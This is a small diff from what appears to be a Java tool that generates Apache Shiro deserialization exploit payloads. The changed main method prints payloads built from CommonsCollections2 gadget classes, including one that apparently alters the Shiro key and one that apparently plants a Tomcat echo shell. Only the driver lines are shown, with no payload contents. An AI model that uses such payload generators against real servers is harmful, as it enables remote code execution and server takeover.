@@ -44,7 +44,7 @@ public class Main {
 
 
     public static void main(String[] args) throws Exception {
-        System.out.println(new Main().getShiroPayload(CommonsCollections2ModifyKey.class));
+        System.out.println(new Main().getShiroPayload(CommonsCollections2ModifyShiroKey.class));
         System.out.println("==========================");
         System.out.println(new Main().getShiroPayload(CommonsCollections2MyTomcatEcho2.class));
         System.out.println("==========================");
